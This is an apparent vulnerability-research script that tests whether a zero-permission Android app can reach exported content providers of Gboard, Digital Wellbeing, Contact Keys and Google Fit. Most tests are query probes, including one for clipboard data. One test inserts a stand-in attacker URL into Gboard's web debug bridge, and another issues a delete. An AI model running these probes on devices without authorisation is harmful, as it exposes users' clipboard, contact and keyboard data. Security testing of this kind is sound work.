#!/usr/bin/env python3
"""Batch 1: content-provider reachability from a zero-permission app."""
import subprocess, sys, time, os
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from probe import run

TESTS = [
 # Gboard Web Debug Bridge — exported, NO permission, inside an app holding
 # READ_CONTACTS / RECORD_AUDIO / CAMERA / GET_ACCOUNTS
 ("gboard_wdb_query_root", {"type":"query","uri":"content://com.google.android.inputmethod.latin.wdb/","label":"gboard-wdb-root"}),
 ("gboard_wdb_query_file", {"type":"query","uri":"content://com.google.android.inputmethod.latin.wdb/file","label":"gboard-wdb-file"}),
 ("gboard_wdb_openfile",  {"type":"openFile","uri":"content://com.google.android.inputmethod.latin.wdb/","label":"gboard-wdb-open"}),
 ("gboard_wdb_insert",    {"type":"insert","uri":"content://com.google.android.inputmethod.latin.wdb/","values":{"url":"https://attacker.test/poc","enabled":"1"},"label":"gboard-wdb-insert"}),
 ("gboard_wdb_delete",    {"type":"delete","uri":"content://com.google.android.inputmethod.latin.wdb/","label":"gboard-wdb-delete"}),
 # Gboard SwissArmyKnifeFileProvider / clipboard provider
 ("gboard_sakf",   {"type":"query","uri":"content://com.google.android.inputmethod.latin.swissarmyknifefileprovider/","label":"gboard-sakf"}),
 ("gboard_clip",   {"type":"query","uri":"content://com.google.android.inputmethod.latin.clipboard_content/","label":"gboard-clip"}),
 ("gboard_tracing",{"type":"query","uri":"content://com.google.android.inputmethod.latin.tracing/","label":"gboard-tracing"}),
 ("gboard_fileprov",{"type":"query","uri":"content://com.google.android.inputmethod.latin.fileprovider/","label":"gboard-fileprovider"}),
 # Digital Wellbeing providers — exported, no permission
 ("wellbeing_api",     {"type":"query","uri":"content://com.google.android.apps.wellbeing.api/","label":"wellbeing-api"}),
 ("wellbeing_root",    {"type":"query","uri":"content://com.google.android.apps.wellbeing/","label":"wellbeing-root"}),
 ("wellbeing_autodnd", {"type":"query","uri":"content://com.google.android.apps.wellbeing.autodnd.ui.provider/","label":"wellbeing-autodnd"}),
 # Contact Keys — Google proximity contact sharing
 ("ck_root",     {"type":"query","uri":"content://com.android.contactkeys.contactkeysprovider/","label":"ck-root"}),
 ("ck_payloads", {"type":"query","uri":"content://com.android.contactkeys.contactkeysprovider/payloads","label":"ck-payloads"}),
 # Google Fit
 ("fit_shared",  {"type":"query","uri":"content://com.google.android.apps.fitness.shared.fileprovider/","label":"fit-fileprovider"}),
]

if __name__ == "__main__":
    only = sys.argv[1] if len(sys.argv) > 1 else None
    for name, cmd in TESTS:
        if only and only not in name:
            continue
        print(f"\n########## {name}")
        out = run(__import__("json").dumps(cmd), name, wait=3)
        for ln in out.splitlines():
            if "VRPPROBE" in ln:
                print(ln.split("VRPPROBE: ", 1)[-1][:600])